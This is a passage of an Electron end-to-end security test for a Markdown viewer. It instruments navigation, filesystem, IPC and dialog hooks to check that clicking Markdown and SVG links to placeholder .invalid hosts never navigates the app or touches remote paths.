    // ABSOLUTE_WEB_URL's `i` flag load-bearing rather than decorative.
    "[caps](HTTPS://api.example.invalid:PORT/v1)",
    "",
    // Inline SVG, both anchor spellings. Not reachable from markdown link
    // syntax - an SVGAElement can only be authored as raw HTML - which is
    // precisely why it went unhandled for so long.
    // Distinct, unclipped hit regions: the former coincident 10px carriers
    // could be dispatched synthetically, but not both clicked by a pointer.
    '<svg width="120" height="42" xmlns="http://www.w3.org/2000/svg">',
    '<a href="http://svg.invalid/p"><text y="16">svgh</text></a>',
    '<a xlink:href="http://xlink.invalid/p"><text y="36">svgx</text></a>',
    "</svg>",
    "",
  ].join("\n");

  const n11Render = async (md) => {
    await n11NoLate();
    if (n11Owner) {
      await closeSecurityImageFixture(n11Owner, n11SourcePath, n11FixtureBody, n11Heading);
      if (n11Shutdown.documentAdmissionIsCurrent(n11Owner.descriptor.ref) !== false) {
        throw new Error("N11 previous source Main admission did not actually retire");
      }
      n11Owner = null;
      await n11NoLate();
    }
    const heading = /^# (.+)$/m.exec(md)?.[1];
    if (!["Totality", "Placeholder", "Whitespace"].includes(heading)) {
      throw new Error("N11 ordinary fixture is not one of its immutable caller documents");
    }
    const file = path.join(s12dir, "n11-" + heading.toLowerCase() + ".md");
    if (n11Exists.call(fs, file) && n11ReadFile.call(fs, file, "utf8") !== md) {
      throw new Error("N11 refuses to overwrite a different fixture body");
    }
    fs.writeFileSync(file, md, "utf8");
    n11Owner = await admitSecurityImageFixture(file, md, heading, [], []);
    n11SourcePath = file; n11FixtureBody = md; n11Heading = heading;
    const normalised = path.normalize(path.resolve(file));
    // Independent fixture metadata, not an expectation learned from a Main
    // record that the terminal filesystem verdict is about to judge.
    n11SourcePaths = Object.freeze({ logical: file, normalised,
      canonical: n11RealPath.call(n11RealPathHost, normalised) });
    n11KnownOwners.set(n11Owner.id, { owner: n11Owner, file, body: md, heading });
    await n11NoLate();
  };

  // A MAIN-PROCESS WITNESS FOR NAVIGATION, because the renderer-side one is
  // not sufficient on its own. Reading `location.href` and a surviving global
  // after the click proves the frame's FINAL identity; it cannot, by itself,
  // rule out a navigation that started and was still in flight at the moment
  // of observation, nor one that left and came back. `did-start-navigation` is
  // non-cancellable and fires for every main-frame navigation attempt
  // including the ones no cancellable event reports - which is exactly the
  // class N15 is about - so it is the only observation that makes the
  // assertion's name ("never navigates") true rather than approximately true.
  const n11Navs = [];
  // THE POSITIONAL ARGUMENTS ARE DEPRECATED. `node_modules/electron/
  // electron.d.ts` marks `url`, `isInPlace` and `isMainFrame` on
  // `did-start-navigation` as @deprecated in favour of the `details` object.
  // Reading only the positionals is a silent time bomb: on the Electron bump
  // that drops them `isMainFrame` becomes undefined, this array never grows,
  // and every assertion that consumes it passes for the worst possible reason.
  // Read `details` first and fall back, so the witness survives the bump in
  // either direction.
  //
  // `isMainFrame` is the right filter for FALSE NEGATIVES: did-start-navigation
  // is the observer hook for every NavigationRequest, including one committing
  // a blocked or error page, so `about:blank#blocked` cannot reach the top
  // frame without firing it. It is too broad for FALSE POSITIVES - a fragment
  // navigation fires with isMainFrame true - so `isSameDocument` is RECORDED
  // rather than filtered on. Filtering would hide a same-document navigation
  // that no assertion here expects; recording names it in the evidence if one
  // ever appears. (Unreachable today: renderer.js contains no location.hash,
  // pushState, replaceState, location.assign/replace or `location.href =`.)
  const onN11Nav = (details, url, _isInPlace, isMainFrame) => {
    const d = details && typeof details === "object" ? details : null;
    const main = d && typeof d.isMainFrame === "boolean" ? d.isMainFrame : isMainFrame;
    if (main) n11Navs.push({ url: (d && d.url) || url, sameDoc: d ? d.isSameDocument : null });
  };
  win.webContents.on("did-start-navigation", onN11Nav);

  // Reloads performed by the recovery below. Counted so the terminal
  // reconciliation can account for every event the listener saw.
  const n11RecoveryLoads = 0;

  const n11Contents = win.webContents, n11Frame = n11Contents.mainFrame;
  const n11PageUrl = n11Contents.getURL();
  const n11Shutdown = require("../src/main.js").__shutdown;
  const n11Shell = require("electron").shell;
  const n11Openers = Object.freeze({ path: n11DataSlotValue(n11Shell, "openPath"),
    external: n11DataSlotValue(n11Shell, "openExternal") });
  const n11SnapshotOpens = n11DataSlotValue(visualUtils, "snapshotExternalOpenCounts");
  const n11AuthorityExpected = Object.freeze({
    native: Object.freeze(Object.getOwnPropertyNames(nativeDialogGuards).map(method =>
      Object.freeze([method, n11DataSlotValue(nativeDialogGuards, method)]))),
    chooser: Object.freeze(Object.getOwnPropertyDescriptor(dialog, "showOpenDialog")),
    prototype: n11DataSlotValue(OwnedDialogs, "prototype"), show: blockSecurityOwnedDialog,
  });
  const n11RealPathHost = fs.realpathSync, n11RealPath = n11RealPathHost.native;
  const n11Stat = fs.statSync, n11Send = n11Contents.send;
  const n11Exists = fs.existsSync, n11ReadFile = fs.readFileSync;
  const n11Registration = { handler: securityGestureRegistration.handler,
    installed: securityGestureRegistration.installed };
  const n11Slots = {
    observer: Object.getOwnPropertyDescriptor(securityGestureRegistration, "observer"),
    send: Object.getOwnPropertyDescriptor(n11Contents, "send"),
    realpath: Object.getOwnPropertyDescriptor(n11RealPathHost, "native"),
    stat: Object.getOwnPropertyDescriptor(fs, "statSync"),
    exists: Object.getOwnPropertyDescriptor(fs, "existsSync"),
    read: Object.getOwnPropertyDescriptor(fs, "readFileSync"),
  };
  const n11Entries = [], n11Sends = [], n11Work = [], n11Faults = [], n11Actions = [];
  const n11KnownOwners = new Map(), n11ReadinessErrors = [];
  let n11Owner = null, n11SourcePath = null, n11FixtureBody = null, n11Heading = null;
  let n11SourcePaths = null;
  let n11Active = null, n11Sealed = null, n11PageInstalled = false;
  let n11Installed = false;
  let n11Failure = null;
  let n11FSDrainDepth = 0, n11PageAttempted = false;
  const n11PageKey = require("node:crypto").randomUUID();
  const n11SamePage = () => !win.isDestroyed() && win.webContents === n11Contents &&
    !n11Contents.isDestroyed() && n11Contents.mainFrame === n11Frame &&
    !n11Frame.isDestroyed() && n11Contents.getURL() === n11PageUrl &&
    n11Frame.url === n11PageUrl;
  function n11Slice(records, start) {
    if (!Number.isSafeInteger(start) || start < 0 || start > records.length) {
      throw new Error("N11 observation history was truncated or has an invalid endpoint");
    }
    return records.slice(start);
  }
  function n11Seal(before, validated) {
    return Object.freeze(Object.fromEntries(Object.keys(before).map(key => {
      if (!Number.isSafeInteger(before[key]) || before[key] < 0 ||
          !Array.isArray(validated[key]) ||
          !Number.isSafeInteger(before[key] + validated[key].length)) {
        throw new Error("N11 cannot seal an invalid or unvalidated history endpoint");
      }
      return [key, before[key] + validated[key].length];
    })));
  }
  function n11Projection(event, data) {
    return { kind: data?.kind, href: data?.href, documentRef: data?.documentRef,
      owner: event.sender === n11Contents,
      frame: event.senderFrame === n11Frame && event.senderFrame === n11Contents.mainFrame,
      windowId: BrowserWindow.fromWebContents(event.sender)?.id ?? null,
      frameId: event.senderFrame?.frameTreeNodeId ?? null };
  }
  const n11Observer = {
    enter(event, data) {
      const entry = n11Projection(event, data), action = n11Active;
      n11Entries.push(entry);
      if (!action?.pending || action.settled || ++action.entries !== 1 ||
          !entry.owner || !entry.frame || entry.windowId !== win.id ||
          entry.kind !== "link" || entry.href !== action.href ||
          entry.documentRef !== action.source.descriptor.ref) {
        n11Faults.push("Unexpected, stale or unattributed actual Main gesture");
        throw new Error(n11Faults.at(-1));
      }
      action.entry = entry;
      return action;
    },
    finish(action, result, error) {
      if (!action || action !== n11Active || action.settled) {
        n11Faults.push("Actual Main settlement lost its N11 action");
        return;
      }
      action.result = result;
      action.error = error ? String(error.message || error) : null;
      action.settled = true;
    },
  };
  const n11ObservedSend = function(channel, value) {
    if (channel === "external-file-open-request" || channel === "show-error") {
      n11Sends.push({ action: n11Active?.id ?? null, channel,
        ...(channel === "show-error" ? { message: value } : { path: value?.filePath }) });
      if (!n11Active?.pending) n11Faults.push("Unattributed late Main delivery");
    }
    return n11Send.apply(this, arguments);
  };
  function n11WorkOwner(owner) {
    if (!owner?.descriptor || !owner.identity) return null;
    return Object.freeze({ tabId: owner.id, documentRef: owner.descriptor.ref,
      pageSession: owner.pageSession, rendererGeneration: owner.identity.rendererGeneration,
      documentGeneration: owner.identity.documentGeneration, pathKey: owner.identity.pathKey });
  }
  function n11SourceRestorationWork(record, context) {
    return record.action === context.action && record.inGesture && record.terminal &&
      !record.error && !record.forbidden && record.phase === "source-restoration" &&
      record.restoration === context && isDeepStrictEqual(record.owner, context.source) &&
      (record.kind === "stat" && record.file === context.paths.logical &&
        record.regular === true && record.directory === false ||
       record.kind === "realpath" && record.file === context.paths.normalised &&
        record.resolved === context.paths.canonical ||
       record.kind === "exists" && record.file === context.paths.logical && record.exists === true);
  }
  function n11FSVerdict(action, work, logical, real) {
    const route = [], restoration = [], targetLifecycle = [], unclassified = [];
    if (action.text !== "txt" && action.text !== "md") {
      return { ok: work.length === 0, route, restoration, targetLifecycle, unclassified: work.slice() };
    }
    const owner = n11WorkOwner(action.source), saved = action.restoration;
    const context = saved?.context;
    const restored = action.text === "md" && saved?.completed === true &&
      context?.action === action.id && isDeepStrictEqual(context.source, owner) &&
      context.target.tabId !== owner.tabId && context.target.documentRef !== owner.documentRef &&
      context.target.rendererGeneration === owner.rendererGeneration &&
      context.target.pageSession === owner.pageSession && context.targetPath === logical;
    const targetWork = record => (record.file === logical || record.file === real) &&
      (record.kind === "realpath" && record.resolved === real ||
       record.kind === "stat" && record.regular === true && record.directory === false ||
       record.kind === "exists" && record.exists === true ||
       record.kind === "read" && ["string", "buffer"].includes(record.readType) &&
         record.length === (action.text === "md" ? "# httpd\n".length : "placeholder".length));
    for (const record of work) {
      const owned = owner !== null && record.action === action.id && record.inGesture &&
        record.terminal && !record.error && !record.forbidden &&
        isDeepStrictEqual(record.owner, owner);
      if (owned && record.phase === "route" && record.restoration === null && targetWork(record)) {
        route.push(record);
      } else if (owned && restored && n11SourceRestorationWork(record, context)) {
        restoration.push(record);
      } else if (owned && restored && targetWork(record) &&
          (record.phase === "source-restoration" && record.restoration === context ||
           record.phase === "post-restoration" && record.restoration === null)) {
        targetLifecycle.push(record);
      } else {
        unclassified.push(record);
      }
    }
    return { ok: unclassified.length === 0 &&
      route.some(w => w.kind === "realpath" && w.file === logical) &&
      route.some(w => w.kind === "stat" && w.file === real) &&
      (action.text !== "md" || restored &&
        restoration.some(w => w.kind === "stat") && restoration.some(w => w.kind === "realpath")),
      route, restoration, targetLifecycle, unclassified };
  }
  function n11ObserveFS(kind, original, receiver, args) {
    const file = String(args[0]), action = n11Active;
    const forbidden = /^(\\\\|\/\/)|:\/\/|(?:probe|api\.example|svg|xlink)\.invalid/i.test(file);
    // A blank/stripped carrier must also expose an accidental filesystem call:
    // conditioning the recorder solely on an expected Main entry would make
    // those no-entry/no-FS legs incapable of noticing the work they forbid.
    // Keep observing after the handler settles: offered target reads and late
    // probes still belong to this pending case. Our own synchronous fixture
    // checks use captured originals, never a path exemption or async mute.
    // Idle no-late/disposal drains have no gesture owner. Keep their work as
    // observed-drain evidence, not silently delegated or credited to Main input.
    const record = forbidden || action?.pending || n11FSDrainDepth > 0 ?
      { action: action?.id ?? null, inGesture: !!action?.entry,
        interval: action?.pending ? "case" : "observed-drain",
        phase: action?.phase ?? null, owner: n11WorkOwner(action?.source),
        restoration: action?.phase === "source-restoration" ? action.restoration?.context ?? null : null,
        kind, file, forbidden, terminal: false } : null;
    if (record) n11Work.push(record);
    if (forbidden) {
      n11Faults.push("Main attempted remote N11 filesystem work");
      check("N11 Main never attempts remote filesystem work", false, JSON.stringify(record));
      throw new Error("N11 safety refusal AFTER recording a failed remote-FS attempt");
    }
    try {
      const result = original.apply(receiver, args);
      if (record) {
        if (kind === "realpath") record.resolved = result;
        else if (kind === "exists") record.exists = result;
        else if (kind === "read") Object.assign(record, {
          readType: typeof result === "string" ? "string" : "buffer", length: result.length,
        });
        else Object.assign(record, { regular: result.isFile(), directory: result.isDirectory() });
      }
      return result;
    } catch (error) {
      if (record) record.error = String(error.message || error);
      throw error;
    } finally { if (record) record.terminal = true; }
  }
  const n11ObservedRealPath = function() {
    return n11ObserveFS("realpath", n11RealPath, this, arguments);
  };
  const n11ObservedStat = function() {
    return n11ObserveFS("stat", n11Stat, this, arguments);
  };
  const n11ObservedExists = function() {
    return n11ObserveFS("exists", n11Exists, this, arguments);
  };
  const n11ObservedRead = function() {
    return n11ObserveFS("read", n11ReadFile, this, arguments);
  };
  async function n11ReadPage() {
    if (!n11SamePage()) throw new Error("N11 page observation no longer owns its original frame");
    return exec(`(() => {
      const p = window.__securityN11;
      if (!p || p.owner !== ${JSON.stringify(n11PageKey)} || p.complete !== true ||
          p.tabs !== window.CustomTabs || p.folia !== window.folia ||
          p.session !== window.getReloadRequestSession() || !Array.isArray(window.__e2eErrors)) {
        throw new Error('N11 page observation lost its owner or suite sentinel');
      }
      return {
        clicks: p.clicks.map(c => ({ found: true, href: c.href, effectiveHref: c.effectiveHref,
          text: c.text, selected: c.selected, trusted: c.event.isTrusted,
          prevented: c.event.defaultPrevented, svgAnchor: c.svgAnchor })),
        errors: p.errors.slice(), notifications: p.notifications.slice(),
        dialogs: p.dialogCalls.slice(), confirms: p.confirmCalls.slice(),
        sentinel: window.__e2eErrors.slice(), modal: p.opened ? [true] : [],
        observing: window.MarkalooDialogs === p.observedDialogs &&
          window.confirm === p.observedConfirm &&
          document.getElementById('notificationToast') === p.toast &&
          document.getElementById('notificationMessage') === p.message,
        href: location.href, navType: performance.getEntriesByType('navigation')[0]?.type ?? null,
      };
    })()`);
  }
  function n11Counts(page, opens) {
    return { shell: opens.shell, external: opens.external, entries: n11Entries.length,
      sends: n11Sends.length, work: n11Work.length, navigation: n11Navs.length,
      faults: n11Faults.length, clicks: page.clicks.length, errors: page.errors.length,
      notifications: page.notifications.length,
      dialogs: page.dialogs.length, confirms: page.confirms.length,
      sentinel: page.sentinel.length, modal: page.modal.length };
  }
  async function n11Barrier() {
    await exec(`new Promise(resolve => requestAnimationFrame(() =>
      requestAnimationFrame(() => resolve(true))))`);
    await exec("window.folia.getVersion()");
  }
  async function n11NoLate() {
    if (!n11Sealed) return;
    n11FSDrainDepth++;
    try {
    await n11Barrier();
    const trapReady = n11AuthorityIntact() && await waitForExternalTrap(win);
    const page = await n11ReadPage();
    const now = n11Counts(page, n11SnapshotOpens());
    if (!isDeepStrictEqual(now, n11Sealed) || !page.observing || !trapReady ||
        n11Faults.length || expectedSecurityQuestion !== null || !n11AuthorityIntact()) {
      check("N11 immutable endpoints reject late or unattributed effects", false,
        JSON.stringify({ sealed: n11Sealed, now, faults: n11Faults }));
      throw new Error("N11 late effects or changed observation authority");
    }
    } finally { n11FSDrainDepth--; }
  }
  async function n11Wait(predicate, label) {
    const deadline = Date.now() + 12000;
    for (;;) {
      const result = await predicate();
      if (result) return result;
      if (Date.now() >= deadline) throw new Error("N11 timed out: " + label);
      await sleep(40);
    }
  }
  async function n11Healthy() {
    try {
      if (!n11SamePage() || !n11Owner) return false;
      const before = n11Shutdown.state();
      if (before.renderer !== "ready") return false;
      const generation = await exec("window.folia.getQuitApprovalGeneration()");
      const owner = await readSecurityImageOwner(n11SourcePath);
      const page = await n11ReadPage();
      const after = n11Shutdown.state();
      return n11SamePage() && page.observing && Array.isArray(page.sentinel) &&
        before.rendererGeneration === after.rendererGeneration && after.renderer === "ready" &&
        generation === after.rendererGeneration && generation === n11Owner.identity.rendererGeneration &&
        after.rendererPageSession === n11Owner.pageSession &&
        n11Shutdown.documentAdmissionIsCurrent(n11Owner.descriptor.ref) === true &&
        securityImageOwnerMatches(owner, n11SourcePath, n11FixtureBody, n11Heading) &&
        owner.id === n11Owner.id && isDeepStrictEqual(owner.identity, n11Owner.identity) &&
        isDeepStrictEqual(owner.descriptor, n11Owner.descriptor) &&
        n11ReadFile.call(fs, n11SourcePath, "utf8") === n11FixtureBody;
    } catch (error) {
      // The caller reports unreadable ownership as a failed boundary.
      n11ReadinessErrors.push(String(error.message || error));
      return false;
    }
  }
  async function n11Install() {
    if (securityGestureRegistration.count !== 1 || typeof n11Registration.handler !== "function" ||
        typeof n11Registration.installed !== "function" ||
        Object.getOwnPropertyDescriptor(securityGestureRegistration, "observer")?.value !== null ||
        typeof n11SnapshotOpens !== "function" ||
        Object.values(n11Slots).some(slot => slot && !Object.hasOwn(slot, "value")) ||
        !n11AuthorityIntact() || expectedSecurityQuestion !== null ||
        !await waitForExternalTrap(win)) throw new Error("N11 Main observation prerequisites failed");
    const empty = await readSecurityImageOwner(null);
    if (empty.tabs.length || empty.id !== null || empty.current !== null ||
        empty.pending.pending || empty.pending.count) throw new Error("N11 requires an actually empty owner");
    // An attempted setup is not a completed installation. Its exact page key
    // lets failure cleanup find only resources actually created by this attempt.
    n11PageAttempted = true;
    const starting = n11SnapshotOpens();
    securityGestureRegistration.observer = n11Observer;
    n11Contents.send = n11ObservedSend;
    n11RealPathHost.native = n11ObservedRealPath;
    fs.statSync = n11ObservedStat;
    fs.existsSync = n11ObservedExists;
    fs.readFileSync = n11ObservedRead;
    n11Installed = true;
    const initial = await exec(`(() => {
      const toast = document.getElementById('notificationToast');
      const message = document.getElementById('notificationMessage');
      if (window.__securityN11 ||
          !Array.isArray(window.__e2eErrors) ||
          !toast || !message ||
          typeof window.MarkalooDialogs?.show !== 'function') throw new Error('N11 page setup is not empty');
      const p = window.__securityN11 = {
        owner: ${JSON.stringify(n11PageKey)}, complete: false,
        subscriptionAttempted: false, dialogsInstalled: false, confirmInstalled: false,
        tabs: window.CustomTabs, folia: window.folia, session: window.getReloadRequestSession(),
        clicks: [], errors: [], notifications: [], toast, message,
        dialogCalls: [], confirmCalls: [], opened: false, target: null,
        dialogs: window.MarkalooDialogs, confirm: window.confirm,
        dialogsDescriptor: Object.getOwnPropertyDescriptor(window, 'MarkalooDialogs'),
        confirmDescriptor: Object.getOwnPropertyDescriptor(window, 'confirm'),
      };
      p.capture = event => {
        const a = event.target?.closest?.('#viewer a');
        if (a) p.clicks.push({ event, href: a.getAttribute('href'),
          effectiveHref: a.getAttribute('href') ?? a.getAttribute('xlink:href'),
          text: a.textContent.trim(), selected: a === p.target, svgAnchor: a instanceof SVGAElement });
      };
      window.addEventListener('click', p.capture, true);
      p.subscriptionAttempted = true;
      p.unsubscribe = window.folia.onError(message => {
        p.errors.push({ message, text: document.getElementById('notificationMessage')?.textContent,
          visible: !!document.getElementById('notificationToast')?.classList.contains('show') });
      });
      if (typeof p.unsubscribe !== 'function') throw new Error('N11 subscription has no cleanup handle');
      p.observedDialogs = Object.freeze({ ...p.dialogs, show(...args) {
        p.dialogCalls.push(String(args[0]?.title || 'untitled'));
        return p.dialogs.show(...args);
      } });
      p.observedConfirm = message => {
        p.confirmCalls.push(String(message));
        throw new Error('Unexpected N11 renderer confirmation');
      };
      window.MarkalooDialogs = p.observedDialogs; p.dialogsInstalled = true;
      window.confirm = p.observedConfirm; p.confirmInstalled = true;
      p.observer = new MutationObserver(records => {
        if (document.querySelector('#appMessageDialog[open]') ||
            records.some(r => r.target.id === 'appMessageDialog' &&
              r.attributeName === 'open' && r.oldValue !== null)) p.opened = true;
        const messageChanged = records.some(r =>
          (r.type === 'childList' || r.type === 'characterData') &&
          (r.target === p.message || p.message.contains(r.target)));
        const showing = records.filter(r => r.target === p.toast && r.attributeName === 'class')
          .map(r => (r.oldValue || '').split(/\\s+/).includes('show'));
        showing.push(p.toast.classList.contains('show'));
        const shown = showing.some((value, i) => value === false && showing[i + 1] === true);
        // A prior toast's delayed hide is not a new notification. Message
        // changes and actual show transitions still expose renderer-only notices
        // without replacing or swallowing the real showNotification function.
        if (messageChanged || shown) p.notifications.push({ text: p.message.textContent,
          visible: p.toast.classList.contains('show') && p.toast.getClientRects().length > 0 });
      });
      p.observer.observe(document.body, { subtree: true, childList: true, characterData: true,
        attributes: true, attributeFilter: ['open', 'class'], attributeOldValue: true });
      p.complete = true;
      return { complete: p.complete, sentinel: window.__e2eErrors.length };
    })()`);
    if (initial?.complete !== true) throw new Error("N11 page setup did not complete");
    n11PageInstalled = true;
    n11Sealed = Object.freeze({ shell: starting.shell, external: starting.external,
      entries: 0, sends: 0, work: 0, navigation: 0, faults: 0, clicks: 0, errors: 0,
      notifications: 0, dialogs: 0, confirms: 0, sentinel: initial.sentinel, modal: 0 });
    await n11NoLate();
  }
  function n11RestoreSlot(object, key, installed, original, descriptor) {
    // A displaced accessor must not reenter application code after the final
    // snapshot. Ownership and release inspect/restore only data descriptors.
    if (Object.getOwnPropertyDescriptor(object, key)?.value !== installed) {
      throw new Error("N11 observation lost ownership: " + key);
    }
    if (descriptor) Object.defineProperty(object, key, descriptor);
    else delete object[key];
    if (descriptor && descriptor.value !== original ||
        !isDeepStrictEqual(Object.getOwnPropertyDescriptor(object, key), descriptor)) {
      throw new Error("N11 observation did not restore its descriptor: " + key);
    }
  }
  function n11DataSlotValue(object, key) {
    // Electron methods may be inherited. A displaced getter is not a value
    // witness, and must never be invoked to check the restored identity.
    for (let owner = object; owner; owner = Object.getPrototypeOf(owner)) {
      const descriptor = Object.getOwnPropertyDescriptor(owner, key);
      if (descriptor) return Object.hasOwn(descriptor, "value") ? descriptor.value : undefined;
    }
    return undefined;
  }
  function n11AuthorityIntact() {
    const chooser = Object.getOwnPropertyDescriptor(dialog, "showOpenDialog");
    return typeof n11Openers.path === "function" && typeof n11Openers.external === "function" &&
      n11DataSlotValue(n11Shell, "openPath") === n11Openers.path &&
      n11DataSlotValue(n11Shell, "openExternal") === n11Openers.external &&
      n11AuthorityExpected.native.every(([method, guard]) =>
        typeof guard === "function" && n11DataSlotValue(dialog, method) === guard) &&
      chooser && Object.hasOwn(chooser, "value") && chooser.writable === false &&
      isDeepStrictEqual(chooser, n11AuthorityExpected.chooser) &&
      n11DataSlotValue(OwnedDialogs, "prototype") === n11AuthorityExpected.prototype &&
      n11DataSlotValue(n11AuthorityExpected.prototype, "show") === n11AuthorityExpected.show;
  }
  async function n11DisposePage() {
    if (!n11SamePage()) throw new Error("N11 refuses disposal in a replacement page; fixtures retained");
    const owners = await exec(`window.CustomTabs.getTabs().map(t => ({
      id: t.id, path: t.filePath, descriptor: window.CustomTabs.getDocumentDescriptor(t.id),
      identity: window.CustomTabs.getDocumentIdentityForTab(t.id, t.filePath,
        window.getReloadRequestSession()),
    }))`);
    if (owners.some(owner => {
      const known = n11KnownOwners.get(owner.id);
      return !known || owner.path !== known.file ||
        !isDeepStrictEqual(owner.descriptor, known.owner.descriptor) ||
        !isDeepStrictEqual(owner.identity, known.owner.identity);
    })) throw new Error("N11 has an unknown live owner; fixtures retained");
    return exec(`(() => {
      const p = window.__securityN11, errors = [];
      if (!p) return null;
      if (p.owner !== ${JSON.stringify(n11PageKey)} ||
          p.tabs !== window.CustomTabs || p.folia !== window.folia ||
          p.session !== window.getReloadRequestSession() || p.close ||
          p.toast !== document.getElementById('notificationToast') ||
          p.message !== document.getElementById('notificationMessage')) {
        throw new Error('N11 page disposal lost its resource owner');
      }
      if (typeof p.capture === 'function') {
        try { window.removeEventListener('click', p.capture, true); } catch { errors.push('capture'); }
      }
      if (typeof p.unsubscribe === 'function') {
        try { p.unsubscribe(); } catch { errors.push('subscription'); }
      } else if (p.subscriptionAttempted) errors.push('subscription cleanup handle unavailable');
      if (p.observer) {
        try { p.observer.disconnect(); } catch { errors.push('observer'); }
      }
      const sameDescriptor = (a, b) => a === b || !!a && !!b &&
        ['value', 'writable', 'get', 'set', 'enumerable', 'configurable'].every(key => a[key] === b[key]);
      const restore = (key, active, original, descriptor, installed) => {
        try {
          const current = Object.getOwnPropertyDescriptor(window, key);
          if (!installed && sameDescriptor(current, descriptor)) return;
          if (typeof active === 'undefined' || current?.value !== active) throw new Error('ownership');
          if (descriptor) Object.defineProperty(window, key, descriptor);
          else delete window[key];
          const restored = Object.getOwnPropertyDescriptor(window, key);
          if (!sameDescriptor(restored, descriptor)) throw new Error('identity');
          // Accessor identity is its complete descriptor, not a getter call
          // after observation teardown. Inherited data must still resolve to
          // the captured original without invoking a displaced accessor.
          if (!descriptor || Object.hasOwn(descriptor, 'value')) {
            let resolved = restored;
            for (let owner = Object.getPrototypeOf(window); !resolved && owner;
                owner = Object.getPrototypeOf(owner)) {
              resolved = Object.getOwnPropertyDescriptor(owner, key);
            }
            if (resolved && !Object.hasOwn(resolved, 'value') ||
                resolved?.value !== original) throw new Error('identity');
          }
        } catch { errors.push(key); }
      };
      restore('MarkalooDialogs', p.observedDialogs, p.dialogs, p.dialogsDescriptor, p.dialogsInstalled);
      restore('confirm', p.observedConfirm, p.confirm, p.confirmDescriptor, p.confirmInstalled);
      if (errors.length) throw new Error('N11 page restoration failure: ' + errors.join(','));
      const endpoints = { clicks: p.clicks.length, errors: p.errors.length,
        notifications: p.notifications.length, dialogs: p.dialogCalls.length,
        confirms: p.confirmCalls.length, sentinel: window.__e2eErrors.length, modal: p.opened ? 1 : 0 };
      delete window.__securityN11;
      return endpoints;
    })()`);
  }

  function n11TargetMatches(target, retained) {
    const identity = target.identity, descriptor = target.descriptor;
    const targetPath = path.join(s12dir, "httpd.md");
    return Number.isSafeInteger(target.id) && target.id > 0 && target.id !== n11Owner.id &&
      target.tabs.length === 2 &&
      target.tabs.filter(t => t.id === n11Owner.id && t.path === n11SourcePath).length === 1 &&
      target.tabs.filter(t => t.id === target.id && t.path === targetPath).length === 1 &&
      target.path === targetPath && target.current === targetPath &&
      target.content === "# httpd\n" && target.original === "# httpd\n" && target.live === "# httpd\n" &&
      descriptor?.logicalPath === targetPath && descriptor.documentUrl === pathToFileURL(targetPath).href &&
      typeof descriptor.ref === "string" && /^[a-f0-9]{64}$/.test(descriptor.ref) &&
      descriptor.ref !== n11Owner.descriptor.ref &&
      identity?.tabId === target.id && identity.documentRef === descriptor.ref &&
      target.pageSession === n11Owner.pageSession && identity.pageSession === n11Owner.pageSession &&
      identity.rendererGeneration === n11Owner.identity.rendererGeneration &&
      Number.isSafeInteger(identity.documentGeneration) && identity.documentGeneration > 0 &&
      typeof identity.pathKey === "string" && identity.pathKey.length > 0 &&
      identity.pathKey !== n11Owner.identity.pathKey &&
      target.state?.maintained === true && target.state.dirty === false &&
      target.state.liveWitnessMatchesContent === true && target.markedDirty === false &&
      target.pending.pending === false && target.pending.count === 0 &&
      target.heading === "httpd" && target.loading === false && !target.welcome &&
      target.images.length === 0 && retained?.id === n11Owner.id && retained.path === n11SourcePath &&
      retained.content === n11FixtureBody && retained.original === n11FixtureBody &&
      retained.markedDirty === false && retained.state?.maintained === true &&
      retained.state.dirty === false && retained.state.liveWitnessMatchesContent === true &&
      isDeepStrictEqual(retained.descriptor, n11Owner.descriptor) &&
      isDeepStrictEqual(retained.identity, n11Owner.identity);
  }
  async function n11RetireTarget() {
    const targetPath = path.join(s12dir, "httpd.md");
    let target, retained;
    await n11Wait(async () => {
      target = await readSecurityImageOwner(targetPath);
      retained = await exec(`(() => {
        const tabs = window.CustomTabs, t = tabs.getTabs().find(t => t.id === ${n11Owner.id});
        return t ? { id: t.id, path: t.filePath, content: t.content, original: t.originalContent,
          markedDirty: t.hasUnsavedChanges, state: tabs.__documentState(t),
          descriptor: tabs.getDocumentDescriptor(t.id),
          identity: tabs.getDocumentIdentityForTab(t.id, ${JSON.stringify(n11SourcePath)},
            window.getReloadRequestSession()) } : null;
      })()`);
      return n11TargetMatches(target, retained);
    }, "actual Markdown target admission, read/render and retained two-tab source");
    const exact = n11TargetMatches(target, retained) &&
      n11Shutdown.documentAdmissionIsCurrent(target.descriptor.ref) === true &&
      n11ReadFile.call(fs, targetPath, "utf8") === "# httpd\n" &&
      n11ReadFile.call(fs, n11SourcePath, "utf8") === n11FixtureBody;
    check("SETUP N11 Markdown target and source have exact actual two-tab Main identities",
      exact, JSON.stringify({ target, retained }));
    if (!exact) throw new Error("N11 refuses to close an unproven Markdown target");
    n11KnownOwners.set(target.id, { owner: target, file: targetPath, body: "# httpd\n", heading: "httpd" });
    const action = n11Active;
    if (!action?.pending || action.text !== "md" || action.source !== n11Owner ||
        action.phase !== "route" || action.restoration ||
        n11SourcePaths?.logical !== n11SourcePath ||
        n11Shutdown.documentAdmissionIsCurrent(n11Owner.descriptor.ref) !== true) {
      throw new Error("N11 source-restoration phase lacks its original admitted source action");
    }
    // This is lifecycle attribution, not an authority receipt. The real two-tab
    // identities/admissions above and actual source readiness/retirement below
    // remain necessary. Each recorder entry retains this immutable context.
    const context = Object.freeze({ action: action.id, source: n11WorkOwner(n11Owner),
      paths: n11SourcePaths, target: n11WorkOwner(target), targetPath });
    const restoration = action.restoration = { context, completed: false };
    action.phase = "source-restoration";
    try {
    await exec(`(() => {
      const p = window.__securityN11, tabs = window.CustomTabs, t = tabs.getActiveTab();
      const state = t && tabs.__documentState(t), pending = window.getPendingSaveStatus();
      if (!p || p.close || t?.id !== ${target.id} || t.filePath !== ${JSON.stringify(targetPath)} ||
          t.content !== '# httpd\\n' || t.originalContent !== '# httpd\\n' || t.hasUnsavedChanges ||
          window.originalMarkdown !== '# httpd\\n' || window.currentFilePath !== ${JSON.stringify(targetPath)} ||
          !state?.maintained || state.dirty || !state.liveWitnessMatchesContent ||
          pending.pending || pending.count !== 0 || tabs.getTabs().length !== 2 ||
          document.querySelector('#viewer h1')?.textContent !== 'httpd' ||
          document.getElementById('loadingScreen')?.classList.contains('active') !== false ||
          JSON.stringify(tabs.getDocumentDescriptor()) !== ${JSON.stringify(JSON.stringify(target.descriptor))} ||
          JSON.stringify(tabs.getActiveDocumentIdentity(${JSON.stringify(targetPath)},
            window.getReloadRequestSession())) !== ${JSON.stringify(JSON.stringify(target.identity))}) {
        throw new Error('N11 target changed before its actual close');
      }
      p.close = { done: false, error: null };
      Promise.resolve().then(() => tabs.closeTab(${target.id})).then(() => { p.close.done = true; },
